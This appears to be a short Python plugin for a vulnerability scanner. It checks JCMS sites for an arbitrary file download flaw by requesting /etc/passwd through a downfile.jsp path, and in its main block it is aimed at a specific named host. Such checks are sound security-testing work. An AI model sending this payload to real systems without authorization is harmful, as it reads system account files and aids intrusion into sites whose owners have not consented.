import re
def assign(service,arg):
    if service == "jcms":
        return True,arg
def audit(arg):
    payload = "vc/vc/columncount/tem/downfile.jsp?filename=/etc/passwd&savename=down.txt"
    url = arg + payload
    code ,head,res,body,_ = curl.curl(url)
    if code == 200 and 'root:' in res:
        security_warning(url)
        
if __name__ == '__main__':
    from dummy import *
    audit(assign('jcms','http://jcms.cscec.com/')[1])